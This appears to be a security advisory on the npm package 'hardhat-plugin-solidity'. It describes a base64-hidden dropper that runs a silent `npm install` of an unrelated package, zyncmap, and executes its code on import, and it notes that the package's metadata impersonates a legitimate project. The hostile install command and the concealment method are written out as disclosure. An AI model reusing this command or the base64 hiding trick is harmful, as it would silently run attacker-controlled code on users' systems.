summary: hardhat-plugin-solidity imports and executes an unrelated npm package via base64-hidden dropper
details: On require()/import of the package, dist/index.js decodes a base64-encoded shell command and runs `npm install zyncmap --no-save --silent --no-audit --no-fund`, then require()s the base64-decoded module name `zyncmap` and invokes its `getPlugin()()`. Both the install command and the target module name are stored as base64 literals (dist/index.js lines 81 and 95) to evade source review. The dropper executes on load, so any consumer that imports this package as a Prettier/Hardhat plugin silently pulls and runs author-controlled third-party code. The package is published as `hardhat-plugin-solidity` but its package.json description and repository URL point to the unrelated legitimate project `prettier-solidity/prettier-plugin-solidity`, deceptively leveraging both ecosystems' naming.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
